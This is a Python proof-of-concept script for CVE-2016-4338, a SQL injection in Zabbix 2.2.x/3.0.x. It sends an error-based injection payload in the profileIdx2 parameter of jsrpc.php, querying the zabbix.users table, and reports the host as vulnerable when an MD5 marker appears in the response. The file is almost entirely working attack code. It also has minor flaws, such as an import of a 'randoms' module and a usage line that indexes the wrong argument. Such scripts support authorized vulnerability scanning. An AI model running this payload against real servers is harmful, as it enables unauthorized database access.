#!/usr/bin/python
# -*- coding: utf-8 -*-

## Zabbix 2.2.x / 3.0.x - SQL Injection
# CVE-2016-4338

import requests
import hashlib
import logging
import randoms as rand


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def md5(string):
    return hashlib.new('md5', string).hexdigest()


def check(zabbix_homepage_url):
    # http://127.0.0.1:8000/jsrpc.php
    isvulnerable, data = False, ''

    jsrpc_URI = zabbix_homepage_url + '/jsrpc.php'
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept-Encoding': 'identity'
    }

    md5_flag = rand.rand_text_numeric(4)
    md5_hash = md5(md5_flag)

    sql = (
        '(select 1 from (select count(*),concat('
        '(select(select concat(cast(concat(0x7e,md5({md5_flag}),0x7e) as char),0x7e)) from zabbix.users LIMIT 0,1),floor(rand(0)*2))x '
        'from information_schema.tables group by x)a)')

    params = {
        'sid': '0bcd4ade648214dc',
        'type': '9',
        'method': 'screen.get',
        'timestamp': '1471403798083',
        'mode': '2',
        'screenid': '',
        'groupid': '',
        'hostid': '0',
        'pageFile': 'history.php',
        'profileIdx': 'web.item.graph',
        'profileIdx2': sql.format(md5_flag=md5_flag),
        'updateProfile': 'true',
        'screenitemid': '',
        'period': '3600',
        'stime': '20160817050632',
        'resourcetype': '17',
        'itemids[23297]': '23297',
        'action': 'showlatest',
        'filter': '',
        'filter_task': '',
        'mark_color': '1'
    }

    resp = requests.get(jsrpc_URI, params=params, headers=headers)
    if resp and resp.status_code == 200 and md5_hash in resp.text:
        logging.info('Zabbix SQLi - {}'.format(jsrpc_URI))
        isvulnerable, data = True, resp.text

    return isvulnerable, data


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("[*] python {} <url>".format(sys.argv[1]))
        sys.exit(1)

    print(check(sys.argv[1]))


## References

# https://support.zabbix.com/browse/ZBX-11023
# https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/zabbix_jsrpc_SQL.json